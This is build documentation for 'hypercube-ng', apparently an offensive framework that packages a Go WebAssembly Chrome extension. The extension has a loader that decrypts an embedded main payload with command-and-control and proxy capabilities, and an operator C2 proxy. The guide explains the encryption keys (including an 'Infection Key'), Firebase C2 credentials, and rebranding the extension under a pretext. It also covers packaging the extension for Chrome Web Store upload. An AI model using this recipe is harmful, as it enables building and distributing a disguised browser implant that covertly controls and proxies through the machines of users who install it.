# WASM Build Process

**WASM compilation, troubleshooting, and custom build configurations for hypercube-ng.**

---

## Overview

Hypercube-ng uses Go compiled to WebAssembly for core logic. Two-stage architecture:
1. **loader-wasm** - Initial loader, decrypts main payload
2. **hypercube-wasm** - Main payload with C2 and proxy capabilities

**Source**: `modules/hypercube-ng/build.sh`, `modules/hypercube-ng/cmd/builder/`

---

## Quick Build

```bash
cd modules/hypercube-ng
./build.sh
```

**Output**: `output/<timestamp>/extension/` directory with `main.wasm` ready for Chrome

---

## Build Process Breakdown

### Step 1: Build hypercube-wasm (Main Payload)

```bash
GOOS=js GOARCH=wasm go build -o loader-wasm/hyperextension.wasm ./hypercube-wasm/
```

**Produces**: `loader-wasm/hyperextension.wasm` (~8-10MB uncompressed)

### Step 2: Compress and Encrypt

```bash
# Compress with gzip
gzip -c hyperextension.wasm > hyperextension.wasm.gz

# Encrypt with AES-256
# Encryption key generated by builder
```

**Produces**: `loader-wasm/hyperextension.wasm.enc` (embedded in loader)

### Step 3: Build loader-wasm

```bash
GOOS=js GOARCH=wasm go build -o extension/main.wasm ./loader-wasm/
```

**Produces**: `extension/main.wasm` (~5-7MB, includes encrypted payload)

### Step 4: Build Proxy Binary

```bash
go build -o proxy ./cmd/proxy/
```

**Produces**: Operator proxy for C2 communication

---

## Builder Tool

**Script**: `cmd/builder/main.go`

**Usage:**

```bash
# Standard build
go build -o builder ./cmd/builder/
./builder

# Regenerate keys (BREAKS existing extensions)
./builder -regenerate-keys

# Target specific platform
./builder -os linux -arch amd64
./builder -os darwin -arch arm64
./builder -os windows -arch amd64
```

**Flags:**
- `-regenerate-keys`: Generate new encryption keys (default: reuse existing)
- `-os`: Target OS (darwin, linux, windows)
- `-arch`: Target architecture (amd64, arm64)

**⚠️ WARNING**: `-regenerate-keys` breaks compatibility with previously built extensions. Use only for new engagements.

---

## Build Artifacts

**Output structure:**

```
output/<timestamp>/
├── extension/                  # Ready for Chrome Store
│   ├── main.wasm              # Compiled WASM
│   ├── background.js          # Service worker
│   ├── wasm_exec.js           # Go WASM runtime
│   ├── firebase-*.js          # Firebase SDK
│   ├── manifest.json          # Extension manifest
│   └── ui/                    # Extension UI
├── proxy                       # Operator C2 binary
└── configs/
    ├── client-config.json     # Extension config
    └── proxy-config.json      # Proxy config
```

---

## Key Management

### Encryption Keys

**Generated during build:**

1. **Infection Key** (AES-256): Encrypts hypercube-wasm payload
2. **Key Material** (Curve25519): Keypair for C2 encryption

**Storage:**
- Keys stored in `loader-wasm/key-material.json`
- Reused across builds unless `-regenerate-keys` specified
- Embedded in both extension and proxy binaries

**Security note**: Keep `key-material.json` secure. Compromise = all extensions built with those keys are compromised.

### Firebase Configuration

**Required files:**

1. **client.json** - Firebase web app credentials
   ```json
   {
     "apiKey": "...",
     "authDomain": "project.firebaseapp.com",
     "databaseURL": "https://project-default-rtdb.firebaseio.com",
     "projectId": "project",
     "storageBucket": "...",
     "messagingSenderId": "...",
     "appId": "..."
   }
   ```

2. **serviceAccountKey.json** - Firebase admin credentials
   - Downloaded from Firebase Console → Project Settings → Service Accounts

**Embedding:**
- `client.json` → embedded in extension WASM
- `serviceAccountKey.json` → embedded in proxy binary

---

## Troubleshooting

### Build Error: "no required module provides package"

**Symptom**: Go can't find module dependencies

**Fix:**
```bash
cd modules/hypercube-ng
go mod tidy
go mod download
```

### Build Error: "GOOS=js GOARCH=wasm not supported"

**Symptom**: Go version too old

**Fix**: Update to Go 1.16+ (WASM support stable in 1.16+)

```bash
go version  # Check current version
# Install Go 1.24+ from https://go.dev/dl/
```

### Runtime Error: WASM fails to load

**Symptom**: Extension loads but WASM doesn't initialize

**Checks:**

1. **CSP configuration** in manifest.json:
   ```json
   "content_security_policy": {
     "extension_pages": "script-src 'self' 'wasm-unsafe-eval'; object-src 'self';"
   }
   ```

2. **wasm_exec.js version match**: Must match Go version used to compile
   ```bash
   # Copy correct wasm_exec.js
   cp "$(go env GOROOT)/misc/wasm/wasm_exec.js" extension/
   ```

3. **File paths**: Verify `main.wasm` in extension root

4. **Service worker context**: Check console in `chrome://extensions/ → Service worker → Inspect`

### Large WASM File Size

**Symptom**: `main.wasm` is 10MB+, slows extension loading

**Optimizations:**

1. **Build with optimization:**
   ```bash
   GOOS=js GOARCH=wasm go build -ldflags="-s -w" -o extension/main.wasm ./loader-wasm/
   ```
   - `-s`: Strip symbol table
   - `-w`: Strip DWARF debugging info

2. **TinyGo** (alternative compiler):
   ```bash
   tinygo build -o extension/main.wasm -target wasm ./loader-wasm/
   ```
   - Smaller binaries (2-3MB vs 8-10MB)
   - Limited standard library support
   - May require code modifications

3. **Compress in manifest:**
   - WASM files are gzip-compressible
   - Chrome automatically decompresses
   - Reduces network transfer but not memory footprint

---

## Custom Builds

### Build for Specific Pretext

**Modify before building:**

1. **Extension name** in `extension/manifest.json`:
   ```json
   "name": "Your Custom Extension Name"
   ```

2. **Firebase config** - Use engagement-specific project:
   - Replace `client.json` with new Firebase project
   - Replace `serviceAccountKey.json`

3. **UI branding** - Update icons and UI:
   - `extension/ui/assets/icon*.png`
   - `extension/ui/popup.html` content

4. **Build**:
   ```bash
   ./builder
   ```

### Debug Build

**Enable verbose logging:**

```bash
# Build with debug symbols
GOOS=js GOARCH=wasm go build -gcflags="all=-N -l" -o extension/main.wasm ./loader-wasm/
```

**Benefits:**
- Better error messages
- Source maps for debugging
- Stacktraces with line numbers

**Drawbacks:**
- Larger file size
- Slower execution
- Not recommended for production

---

## Build Verification

### Checklist

After building, verify:

- [ ] `extension/main.wasm` exists and is 5-10MB
- [ ] `extension/manifest.json` has correct name (not "HYPEREXTENSION")
- [ ] `extension/background.js` present
- [ ] `extension/wasm_exec.js` present
- [ ] Firebase SDK files present (`firebase-*.js`)
- [ ] `proxy` binary built for target platform
- [ ] `configs/` directory contains both JSON files

### Testing

```bash
# Load extension in Chrome
# chrome://extensions/ → Load unpacked → select extension/ directory

# Check service worker console
# Should see "Go WASM initialized" or similar
# Should see Firebase connection logs
# Should NOT see WASM loading errors
```

---

## Build for Distribution

### Package for Chrome Store

```bash
cd output/<timestamp>/extension
zip -r ../extension.zip .
```

**Result**: `extension.zip` ready for Chrome Web Store upload

**⚠️ Before packaging:**
- Update `manifest.json` name and description
- Verify all assets are present
- Test locally first
- Check file size (max 20MB for Chrome Store)

---

## References

- **Build script**: `modules/hypercube-ng/build.sh`
- **Builder source**: `modules/hypercube-ng/cmd/builder/main.go`
- **Go WASM**: https://github.com/golang/go/wiki/WebAssembly
- **wasm_exec.js**: `$(go env GOROOT)/misc/wasm/wasm_exec.js`
